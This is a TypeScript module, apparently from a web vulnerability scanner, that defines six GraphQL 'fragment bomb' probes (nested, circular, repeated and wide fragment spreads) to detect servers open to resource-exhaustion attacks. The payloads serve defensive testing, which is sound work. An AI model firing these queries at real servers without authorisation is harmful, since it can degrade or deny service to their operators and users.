import type { PayloadVariant } from '../types';

export const META = {
  id: 'graphql-fragment-bomb',
  family: 'graphql-attack' as const,
  name: 'GraphQL Fragment Bomb',
  description: 'Detects GraphQL servers vulnerable to deeply nested or circular fragment expansion causing excessive CPU/memory.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['graphql', 'body', 'json'],
};

const PROBES = [
  {
    value: '{"query":"fragment f1 on Query{__typename ...f2}fragment f2 on Query{__typename ...f3}fragment f3 on Query{__typename ...f4}fragment f4 on Query{__typename ...f5}fragment f5 on Query{__typename}query{...f1}"}',
    intent: 'Deeply nested 5-level fragment chain to test expansion CPU cost',
    signals: ['anomaly-delta', 'dos-vector'],
  },
  {
    value: '{"query":"fragment a on Query{__typename ...b}fragment b on Query{__typename ...a}query{...a}"}',
    intent: 'Circular fragment reference attempt — server should reject or loop',
    signals: ['anomaly-delta', 'graphql-error'],
  },
  {
    value: '{"query":"fragment dup on Query{__typename __typename __typename __typename __typename}query{...dup ...dup ...dup ...dup ...dup}"}',
    intent: 'Field duplication via repeated spread of fragment with duplicate fields',
    signals: ['anomaly-delta'],
  },
  {
    value: '{"query":"fragment f on Query{__typename}query{' + Array(50).fill('...f').join(' ') + '}"}',
    intent: 'Single fragment spread 50 times in one query to amplify execution cost',
    signals: ['anomaly-delta'],
  },
  {
    value: '{"query":"fragment deep on Query{__typename}' + Array(20).fill(null).map((_, i) => `fragment d${i} on Query{__typename ...deep}`).join('') + 'query{...d0}"}',
    intent: 'Wide fragment tree — 20 fragments all referencing base fragment',
    signals: ['anomaly-delta'],
  },
  {
    value: '{"query":"query{__typename __typename __typename __typename __typename __typename __typename __typename __typename __typename}"}',
    intent: '__typename field repeated 10 times without fragments as baseline amplification check',
    signals: ['anomaly-delta'],
  },
];

export function variants(): PayloadVariant[] {
  return PROBES.map((p, i) => ({
    id: `gql-frag-bomb-${i + 1}`,
    family: 'graphql-attack' as const,
    value: p.value,
    encoding: 'raw' as const,
    intent: p.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: p.signals,
  }));
}
